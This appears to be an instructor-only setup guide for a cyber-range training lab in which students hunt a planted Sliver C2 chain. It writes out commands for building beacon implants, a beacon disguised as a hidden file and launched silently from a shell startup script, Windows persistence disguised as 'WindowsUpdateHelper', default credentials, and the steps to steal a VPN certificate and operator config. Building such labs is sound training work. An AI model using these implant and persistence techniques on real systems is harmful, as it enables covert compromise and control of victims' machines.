---
id: B03.M08-setup
title: SquidLab — Setup Guide
artifact_type: setup_guide
audience: instructor
block: B03
module_type: lab
legacy_aliases: []
source_status: authored
review_required: false
output_formats:
- docx
- pdf
template_profile: setup_guide_v1
sensitivity: instructor_only
environments:
- b03_squidlab
- week3-constrained
- classroom-shared
---

# SquidLab — Setup Guide

## When this applies

Pre-class deploy for B03.M08. Student access is a Structured Content Event from `week3-constrained`. Shared instructor access is a Live Action Event for `classroom-shared`. Hyper-V notes below are proof-host only.

## Prerequisites

- Range support can create the Structured Content Event and deploy the Live Action Event named below
- Registry: [`course/operations/pcte-range-specifications.md`](../../../../course/operations/pcte-range-specifications.md)
- Lab LAN `172.16.173.0/24` on `classroom-shared` (gateway and DNS `172.16.173.254`)

## Related verification

[`verification-runbook.md`](./verification-runbook.md)

## Pre-class steps

1. Create a Structured Content Event from `week3-constrained`. Clone `ACTEC_CS_Ops_Wk3_CS1.5`, NetSpec `ACTEC-CS_Ops_Week3`, plan `ACTEC Counterstrike Ops Module 3`. This is student access, including the Windows seat `victim`.
2. Deploy a Live Action Event for `classroom-shared`. Clone `ACTEC_CSO_CLASSROOM_SHARED_CS_2.0`, NetSpec `ACTEC_CSO_CLASSROOM_SHARED_NS`. This is shared instructor access to the classwide guests.
3. Confirm the guests in [section 0](#0-what-you-are-building), then run [`verification-runbook.md`](./verification-runbook.md).

**Reset.** Redeploy the PCTE range, or redeploy the specific VM, from the same clone. Do not build a new hypervisor VM for class.

After deploy, reach the classwide guests with `ssh blue-ops`, then the `spark-all` key: `admin@172.16.173.100` (pfSense), `range_admin@172.16.173.101` (C2), `Administrator@172.16.173.200` (Windows, `cmd.exe`). The student Windows seat is hostname `victim` at lab address `80.90.100.11/24`. Reach it with `ssh kali-squid-stu`, then the `spark-all` key as `wsl`. Students start with `wsl -d Alpine` on that seat. Kali is builder access, not the student start. The other NIC, `10.10.80.11/16`, is the PCTE management NIC only.

Student path (do not hand this whole file to students): Alpine WSL implant → pfSense redirector (default creds) → stolen OpenVPN cert → redspace `192.168.135.0/24` → Sliver operator config → C2 survey. Student-facing hunt steps live in [`instructor-guide.md`](./instructor-guide.md). Go/no-go checks: [`verification-runbook.md`](./verification-runbook.md).

Bake scripts live in [`environments/b03_squidlab/`](../../../../environments/b03_squidlab/). Baked Alpine image on the proof host: `C:\WSL\Alpine\Alpine.tar`.

---

## 0. What you are building

```
Student Windows PC
  WSL distro "Alpine"
    /root/.bash          Sliver HTTP beacon (disguised)
    /root/.ashrc         silent persist (set +m, no job spam)
         |
         | HTTP :80
         v
172.16.173.100    Squid-Redirector   pfSense CE 2.6.0     (classroom-shared)
  GUI/SSH        admin / pfsense
  artifact       /root/.tmp/redir-cert.ovpn
  OpenVPN client tun0  192.168.135.2
  NAT            WAN TCP/80  ->  192.168.135.1:80
         |
         | OpenVPN 192.168.135.0/24
         v
192.168.135.1 / 172.16.173.101    Squid-C2   Rocky Linux 9     (classroom-shared)
  SSH            root / counterstrike
  Sliver         HTTP :80   operator mTLS :31337
  OpenVPN server UDP/1194   duplicate-cn   tun0 192.168.135.1
  Staging        http://192.168.135.1:8000/   (/opt/squid-stage)

172.16.173.200     Squid-WinSvr02   Windows Server (eval)  (classroom-shared)
  Hostname       Octagon-SECDEF
  Users          SECDEF, sq-id     (LabPassw0rd!)
  Implant        C:\Users\sq-id\Downloads\AVERAGE_EPEE.exe
  Callback       HTTP :80 -> 172.16.173.100 (same redirector as Alpine)
  Purpose        live session students find and REPORT on the C2 (do not kill)
```

Lab subnet is **`172.16.173.0/24`** (gateway `172.16.173.254`, DNS `172.16.173.254`). The student Windows seat must reach `172.16.173.100` directly.

Class start is the two deploys above. Sections 4–7 rebuild a guest inside an already deployed range before that clone is updated. Hyper-V notes in those sections are proof-host only.

---

## 1. PCTE networking

Classwide guests share `172.16.173.0/24` on the `classroom-shared` Live Action Event. Builder path is `ssh blue-ops`, then SSH with the `spark-all` key. Student seats come from the `week3-constrained` Structured Content Event.

| Network | Who is on it | Notes |
|---|---|---|
| Lab LAN (`172.16.173.0/24`) | C2 `172.16.173.101`, pfSense WAN `172.16.173.100`, Win-Svr02 `172.16.173.200` | Gateway and DNS `172.16.173.254`. This is the range students nmap |
| Builder jump | `blue-ops` on `192.168.211.0/24` (DHCP; often `.10` or `.11`) | C2 allows TCP 22 from this subnet only. Other ports stay dropped |

Guests have no internet. Copy installers to `blue-ops`, then to the guest. pfSense WAN is the lab NIC at `172.16.173.100`. Do not block private networks on that WAN.

Do not stand up a second C2 at `172.16.173.101` while a live classroom C2 already uses that address.

---

## 2. Downloads

Only for rebuilding a guest that is not already in the clone. Class deploy does not use these ISOs.

| Item | Download | Notes |
|---|---|---|
| Alpine minirootfs | https://dl-cdn.alpinelinux.org/alpine/v3.24/releases/x86_64/alpine-minirootfs-3.24.1-x86_64.tar.gz | Or ship the baked `Alpine.tar` |
| pfSense CE **2.6.0** AMD64 DVD ISO | https://www.pfsense.org/download/ | Pin **2.6.0**, not current |
| pfSense 2.6.0 mirror | https://repo.ialab.dsu.edu/pfsense/pfSense-CE-2.6.0-RELEASE-amd64.iso.gz | Gunzip before mounting |
| Rocky Linux 9 minimal | https://download.rockylinux.org/pub/rocky/9/isos/x86_64/ | |
| Windows Server eval | https://go.microsoft.com/fwlink/?linkid=2345730&clcid=0x409&culture=en-us&country=us | Only if you build Win-Svr02 |
| Sliver | `curl https://sliver.sh/install \| sudo bash` on C2 | |
| OpenVPN (Rocky) | `dnf install epel-release openvpn easy-rsa` | |

---

## 3. Reset

Redeploy the Structured Content Event, the Live Action Event, or the single VM that needs a clean start. Use the same clone named in the pre-class steps. A reset does not create a new hypervisor VM.

---

## 4. C2 — Rocky 9 (rebuild only)

### 4.1 OS install

- Hostname: `squid-c2`
- Root password used in this rebuild: **`counterstrike`**
- One lab NIC is enough. Gateway and DNS on this range are `172.16.173.254`

```bash
nmcli con mod 'System eth0' ipv4.method manual \
  ipv4.addresses 172.16.173.101/24 ipv4.gateway 172.16.173.254 ipv4.dns 172.16.173.254
nmcli con up 'System eth0'
hostnamectl set-hostname squid-c2
systemctl disable --now firewalld
```

If the interface is `ens192` / `ens33`, use that name (`nmcli -t -f DEVICE,TYPE device`).

Rocky 9 **refuses root password SSH** (`PermitRootLogin prohibit-password`) even if you set a root password at install:

```bash
echo -e 'PermitRootLogin yes\nPasswordAuthentication yes' > /etc/ssh/sshd_config.d/99-squid-lab.conf
systemctl restart sshd
```

If Lab LAN has no internet, add a second NIC on a port group that can reach yum, keep that NIC as the default route, and set the lab NIC with `ipv4.never-default yes`.

### 4.2 Bootstrap Sliver + OpenVPN + staging

From an instructor workstation that can SSH to `172.16.173.101`, copy from the course repo root:

```powershell
scp environments/b03_squidlab/c2-bootstrap.sh environments/b03_squidlab/c2-env-check.sh environments/b03_squidlab/c2-sliver-finish.sh root@172.16.173.101:/root/
```

```bash
chmod +x /root/*.sh
sed -i 's/\r$//' /root/*.sh
bash /root/c2-bootstrap.sh
```

That installs EPEL, OpenVPN, Easy-RSA, Sliver (`curl https://sliver.sh/install | bash`), writes `/etc/openvpn/server/server.conf` with **`duplicate-cn`** (same client cert on pfSense *and* every student), and serves `/opt/squid-stage` on **TCP/8000**.

Sliver’s `operator` subcommand needs `--permissions all`:

```bash
/root/sliver-server operator --name squid-op --permissions all --lhost 192.168.135.1 --lport 31337 --save /opt/squid-stage/squid-op_192.168.135.1.cfg
python3 - << 'PY'
import json, pathlib
p = pathlib.Path("/opt/squid-stage/squid-op_192.168.135.1.cfg")
d = json.loads(p.read_text())
d["lhost"] = "172.16.173.101"
pathlib.Path("/opt/squid-stage/squid-op_172.16.173.101.cfg").write_text(json.dumps(d))
PY
```

Then in `sliver-client` (local operator cfg is created by the installer):

```
http -L 0.0.0.0 -l 80

profiles new beacon --http 172.16.173.100:80 --os linux --arch amd64 --format elf --skip-symbols --seconds 60 --jitter 30 alpine-redir
profiles generate alpine-redir --save /opt/squid-stage/alpine.bash --name alpine-wsl

generate beacon --http 172.16.173.100:80 --os windows --arch amd64 --format exe --skip-symbols --save /opt/squid-stage/AVERAGE_EPEE.exe --name AVERAGE_EPEE

jobs
profiles
implants
```

If `profiles generate` errors `UNIQUE constraint failed: implant_builds.name`, use a new `--name`. If it errors `rename import dir: target exists`, `rm -rf /root/.sliver/slivers/linux/amd64/<name>` and retry.

Persist the HTTP listener across reboot: `/root/sliver-http.rc` containing `http -L 0.0.0.0 -l 80` / `exit`, plus a systemd oneshot `sliver-http.service` `After=sliver.service`.

Symlink if `c2-env-check.sh` cannot find the binary: `ln -sf /root/sliver-server /usr/local/bin/sliver-server`.

### 4.3 Check C2

```bash
bash /root/c2-env-check.sh
```

Expect: sliver-server running, OpenVPN active, `tun0` = `192.168.135.1/24`, TCP 80 / 8000 / 31337, UDP 1194, staged `.ovpn` + operator cfg + implants.

SSH: `root` / `counterstrike` @ `172.16.173.101`


---

## 5. Redirector — pfSense CE 2.6.0

### 5.1 OS install

BIOS firmware. At the pfSense assign-interfaces prompt:

- **WAN** = NIC on Lab LAN (this becomes `172.16.173.100`)
- **LAN** = optional second NIC (teacher-only `192.168.1.1`). Skip LAN if you only have one NIC; then manage on WAN.

Leave the GUI password **`admin` / `pfsense`**. Students use it.

Default LAN (if assigned) is `192.168.1.1`. SSH is **off** until you enable it (console option 14, or System → Advanced → Admin Access → Enable Secure Shell). First-boot GUI is `https://192.168.1.1` if LAN exists, otherwise `https://172.16.173.100` after you set the WAN address.

Disconnect the ISO after install.

### 5.2 Lab addressing and port 80 redirect

1. Enable SSH.
2. Keep WAN at **`172.16.173.100/24`**. Gateway on this range is `172.16.173.254`. Do **not** enable “Block private networks” on WAN (the whole lab is RFC1918).
3. NAT Port Forward: WAN, TCP, destination WAN address port **80**, redirect target **`192.168.135.1:80`**.
4. WAN firewall: pass TCP 22, 80, 443 and ICMP.
5. Copy the C2 client config onto the box:

```text
/root/.tmp/redir-cert.ovpn
```

```bash
scp root@172.16.173.101:/opt/squid-stage/pfsense-redir.ovpn admin@172.16.173.100:/root/.tmp/redir-cert.ovpn
```

(Use `admin` for pfSense SSH.)

6. Persistence: `environments/b03_squidlab/pfsense-ovpn-persist.sh` → `/root/ovpn-persist.sh`, cron every minute. Starts OpenVPN if `tun0` is down.

`pfsense-squid-setup.php` was written against Hyper-V names (`hn0`/`hn1`). The fielded redirector uses `vmx*`. Do not run that PHP unchanged. Set WAN/LAN in the GUI, or edit the PHP `if` values to the live NIC names (`ifconfig`) before `php -f /root/pfsense-squid-setup.php`.

### 5.3 Check redirector

```text
ifconfig            # WAN 172.16.173.100 on vmx0 or em0
ifconfig tun0       # 192.168.135.2 -> 192.168.135.1
ping 172.16.173.101
ping 192.168.135.1
curl -I http://192.168.135.1/          # Sliver HTTP 404 is success
ls -l /root/.tmp/redir-cert.ovpn
ssh admin@172.16.173.100           # password pfsense
```

`pfctl -s nat` should rdr WAN TCP 80 → `192.168.135.1`.

---

## 6. Alpine student WSL image

Students import a WSL distro on the Windows seat from the Structured Content Event. Rebuild it on that seat, or on any instructor Windows box that can reach the C2, then copy `alpine.bash` off the C2 first.

### 6.1 Why this is fiddly

- Sliver’s Linux ELF is **glibc** (`/lib64/ld-linux-x86-64.so.2`). Alpine is **musl**. Without `gcompat`, `/root/.bash` exits **127** (“not found”) and ash prints `Done(127)` on login — that spoils the forensic exercise.
- Source `.ashrc` from **one** place only (`.profile`). Do **not** also hook `/etc/profile`.
- Use `set +m` so ash does not print job-control `Done` lines.

### 6.2 Bake

```powershell
wsl --import Alpine C:\WSL\Alpine alpine-minirootfs-3.24.1-x86_64.tar.gz
```

```sh
apk update
apk add gcompat libgcc
# copy alpine.bash from C2 /opt/squid-stage/
cp /mnt/c/path/to/alpine.bash /root/.bash
chmod 755 /root/.bash
```

`/root/.ashrc`:

```sh
set +m
if [ -x /root/.bash ]; then
	if ! ps | grep -v grep | grep -q "/root/.bash"; then
		/root/.bash >/dev/null 2>&1 </dev/null &
	fi
fi
```

`/root/.profile`:

```sh
export ENV=/root/.ashrc
[ -r /root/.ashrc ] && . /root/.ashrc
```

Helpers: `environments/b03_squidlab/bake-alpine.sh` and `Bake-AlpineWsl.ps1`. Windows Defender will quarantine the ELF; exclude the work folder or copy via WSL.

```powershell
wsl --export Alpine C:\WSL\Alpine\Alpine.tar
```

### 6.3 Student import

Hand out `Alpine.tar` plus the Alpine WSL import steps issued with the student image.

```powershell
mkdir C:\WSL\Alpine
wsl --import Alpine C:\WSL\Alpine C:\WSL\Alpine\Alpine.tar
wsl -d Alpine
```

Login must be a **clean prompt**. Students find the implant with `ls -la /root/` and `ps`. Beacon target is **`172.16.173.100:80`** (redirector), which student PCs on CSO NET can reach.

---

## 7. Win-Svr02 — Octagon-SECDEF

Optional to ship the kit; required for the “find the C2 session and report” objective.

On the deployed Win-Svr02 guest, copy:

- `environments/b03_squidlab/win-svr02-scenario.ps1`
- `AVERAGE_EPEE.exe` from C2 `/opt/squid-stage/AVERAGE_EPEE.exe`

Elevated PowerShell **on the VM**:

```powershell
Set-ExecutionPolicy -Scope Process Bypass
.\win-svr02-scenario.ps1 -ImplantPath C:\Temp\AVERAGE_EPEE.exe -LabIP 172.16.173.200 -Prefix 24 -Gateway 172.16.173.254 -Dns 172.16.173.254
```

| Setting | Default in script | On classroom-shared |
|---|---|---|
| Hostname | `Octagon-SECDEF` | same |
| Users | `SECDEF`, `sq-id` | same, password `LabPassw0rd!` |
| IP | `172.16.44.83/23` | `172.16.173.200/24` |
| Gateway | `172.16.44.127` | pass **`-Gateway 172.16.173.254`** |
| DNS | `172.16.44.102` | pass **`-Dns 172.16.173.254`** |
| Implant | `C:\Users\sq-id\Downloads\AVERAGE_EPEE.exe` | same |
| Persist | task `WindowsUpdateHelper` at logon as `sq-id` | same |

Reboot if the hostname changed, log on as **`sq-id`**, then on C2: `beacons` / `sessions`. Look for `Octagon-SECDEF`. Students **report** that session. They must not kill it.

---

## 8. End-to-end instructor check

From a seat that can reach `172.16.173.0/24`:

1. `wsl -d Alpine` → clean prompt; `ps` shows `/root/.bash`.
2. `nmap -Pn -sV -p 22,80,443 172.16.173.100` → pfSense.
3. `https://172.16.173.100` → `admin` / `pfsense`. Confirm NAT 80 and OpenVPN up.
4. `scp admin@172.16.173.100:/root/.tmp/redir-cert.ovpn .`
5. `sudo openvpn --config redir-cert.ovpn` → `tun0` in `192.168.135.0/24`. (WSL has no `/dev/net/tun` by default — use Windows OpenVPN or a full Linux NIC.)
6. `curl http://192.168.135.1:8000/` → operator cfg + ovpn files.
7. Edit stolen cfg `lhost` to `192.168.135.1` if it still says `172.16.173.101`.
8. `sliver-client import squid-op_192.168.135.1.cfg` → Alpine beacon, and Octagon-SECDEF if Win-Svr02 is live.
9. `c2-env-check.sh` on C2 is all PASS.
10. Enable iptables rules on C2 to only allow from redirector.
```
# 1. This will allow all currently active connections(if your ssh'd in it wont drop)
sudo iptables -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT

# 2. Allow all internal loopback traffic (required for system applications)
sudo iptables -A INPUT -i lo -j ACCEPT

# 3. Redirector and the OpenVPN overlay
sudo iptables -A INPUT -s <Redir IP> -j ACCEPT
sudo iptables -A INPUT -s <openvpn network.0/24> -j ACCEPT
# 4. Builder SSH only. Student traffic can arrive from 192.168.211.10 after NAT.
sudo iptables -A INPUT -p tcp -s 192.168.211.0/24 --dport 22 -j ACCEPT
# 5. Change the default policy to DROP all other incoming traffic
sudo iptables -P INPUT DROP
```


If students can hit `:8000` or Sliver **without** the VPN, isolation is wrong — fix before class.

---

## 9. What you hand students

| Artifact | Where |
|---|---|
| Alpine.tar + import steps | `C:\WSL\Alpine\Alpine.tar` and `student\Alpine WSL Lab Image - Installation.txt` |
| Range clue | Redirector `172.16.173.100` only. Do not pre-brief C2 / VPN net. |
| Hunt key (instructors only) | [`instructor-guide.md`](./instructor-guide.md) |

---

## 10. Credentials

| System | User | Password | Notes |
|---|---|---|---|
| Squid-C2 | root | `counterstrike` | Enable `PermitRootLogin yes` |
| pfSense | admin | `pfsense` | GUI + SSH; **do not change** |
| Win-Svr02 | SECDEF, sq-id | `LabPassw0rd!` | After `win-svr02-scenario.ps1` |

C2: `ssh root@172.16.173.101`  
pfSense: `https://172.16.173.100` and `ssh admin@172.16.173.100`

---

## 11. Kit map

```
environments/b03_squidlab/
  README.md
  c2-bootstrap.sh                Rocky: packages, Sliver, OpenVPN, staging
  c2-sliver-finish.sh            operator cfg + generate implants
  c2-env-check.sh                sliver / tun0 / ports / staged files
  pfsense-ovpn-persist.sh        cert + tun0 watchdog
  pfsense-squid-setup.php        Hyper-V NIC names — proof-host only
  bake-alpine.sh / Bake-AlpineWsl.ps1
  win-svr02-scenario.ps1         Octagon-SECDEF flavor + implant
  New-SquidLabVMs.ps1            laptop Hyper-V only
blocks/.../B03.M08-squidlab/setup-guide.md   this file
C:\WSL\Alpine\Alpine.tar                    student image on the proof host
```

---

## 12. Gotchas

- **Listener is :80.** Alpine and the Windows host both beacon at the **redirector** (`172.16.173.100`). pfSense forwards that to the C2. The Windows row stays distinct by hostname `Octagon-SECDEF`.
- OpenVPN **must** use `duplicate-cn` so pfSense and every student share one client cert.
- Operator cfg is served with `lhost=172.16.173.101` on purpose; students change it to `192.168.135.1` after they get on the tunnel.
- Fielded pfSense NICs are `vmx*`. Hyper-V proof-host NICs are `hn*`.
- Rocky root SSH is off until you allow it. `firewalld` off for the lab.
- Alpine implant needs **`apk add gcompat libgcc`**. Persist only from `.ashrc` via `.profile`, with `set +m`.
- Defender will eat `AVERAGE_EPEE.exe` and `alpine.bash` on Windows. Exclude lab folders or copy through WSL/scp.
- After class, redeploy the PCTE range or the specific VM from the same clone.
